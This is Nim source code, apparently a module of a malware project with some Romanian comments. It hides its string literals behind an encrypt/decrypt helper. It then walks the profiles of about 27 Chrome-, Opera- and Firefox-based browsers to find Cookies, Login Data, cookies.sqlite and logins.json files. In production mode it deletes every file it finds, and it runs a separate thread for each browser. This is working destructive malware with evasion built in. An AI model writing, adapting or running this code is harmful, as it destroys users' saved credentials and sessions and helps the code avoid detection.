## THIS THREAD MIGHT NEED OPTIMIZATIONS 
## BECAUSE OF THE CONSTANT ENCRYPTING AND DECRYPTING
## OF STRING LITERALS

from os import `/`
from os import getEnv
from os import walkDir
from os import PathComponent # pcDir
from os import existsDir
from os import existsFile

from strutils import startsWith

from ../constants import isProd

import ../functions/hideString

when isProd:
  from ../functions/removeFile import removeFileOrSleep

type
  BROWSER_TYPES = enum
    CHROME_BASED
    OPERA_BASED # still CHROME_BASED but uses a slightly different file structure
    FIREFOX_BASED
  browserType = tuple[based: BROWSER_TYPES, folders: seq[string]]
  browserThreadArgs = tuple[
    based: BROWSER_TYPES,
    folder: string,
    appdata: string,
    localappdata: string
  ]
  browserThreadType = Thread[browserThreadArgs]

# mai bn array decat seq ca ii mai performant asa
const browsers: array[3, browserType] = [
  (
    CHROME_BASED,
    @[
      e"Google\Chrome",
      e"Microsoft\Edge",
      e"7Star\7Star",
      e"Amigo",
      e"BraveSoftware\Brave-Browser",
      e"CentBrowser",
      e"Chedot",
      e"Google\Chrome SxS",
      e"Chromium",
      e"CocCoc\Browser",
      e"Comodo\Dragon",
      e"Elements Browser",
      e"Epic Privacy Browser",
      e"Kometa",
      e"Orbitum",
      e"Sputnik\Sputnik",
      e"Torch",
      e"uCozMedia\Uran",
      e"Vivaldi",
      e"Yandex\YandexBrowse"
    ]
  ),
  (
    OPERA_BASED,
    @[
      e"Opera Software\Opera Stable"
    ]
  ),
  (
    FIREFOX_BASED,
    @[
      e"Mozilla\Firefox\Profiles",
      e"NETGATE Technologies\BlackHawk",
      e"8pecxstudios\Cyberfox",
      e"Comodo\IceDragon",
      e"K-Meleon,",
      e"Mozilla\icecat"
    ]
  ),
]

proc getNoOfThreads(): int =
  for b in browsers:
    for f in b.folders:
      result += 1

const noOfThreads: int = getNoOfThreads()

proc initSearchThread(args: browserThreadArgs): void {.thread.} =
  let (based, folder, appdata, localappdata) = args

  var
    fullFolder: string = ""
    files: seq[string] = @[]

  case based
  of CHROME_BASED, OPERA_BASED:
    let isOpera: bool = based == OPERA_BASED

    fullFolder =
      if isOpera:
        appdata / folder
      else:
        localappdata / folder / d e"User Data"

    if existsDir(fullFolder):
      # add default user data
      files.add d e"Default\Cookies"
      files.add d e"Default\Login Data"

      for kind, maybeProfile in walkDir(fullFolder, true):
        if kind == pcDir:
          # if maybeProfile is a profile
          if maybeProfile.startsWith(d e"Profile"):
            # maybeProfile is now for sure a profile
            files.add maybeProfile / d e"Cookies"
            files.add maybeProfile / d e"Login Data"

  of FIREFOX_BASED:
    fullFolder = appdata / folder

    if existsDir(fullFolder):
      for kind, profile in walkDir(fullFolder, true):
        if kind == pcDir:
          files.add profile / d e"cookies.sqlite"
          files.add profile / d e"logins.json"

  for file in files:
    let fullPath: string = fullFolder / file

    if existsFile(fullPath):
      # daca nu e production atunci doar fa echo
      when isProd:
        removeFileOrSleep(fullPath)
      else:
        echo fullPath


proc initBrowserThread*(): void {.thread.} =
  let
    appdata: string = getEnv(d e"appdata")
    localappdata: string = getEnv(d e"localappdata")

  var
    threads: seq[browserThreadType] = newSeq[browserThreadType](noOfThreads)
    i = 0
  for browser in browsers:
    for folder in browser.folders:
      createThread(
        threads[i],
        initSearchThread,
        (
          browser.based,
          d folder, # decrypt folder
          appdata,
          localappdata
        )
      )
      i += 1

  joinThreads(threads)

# initBrowserThread()
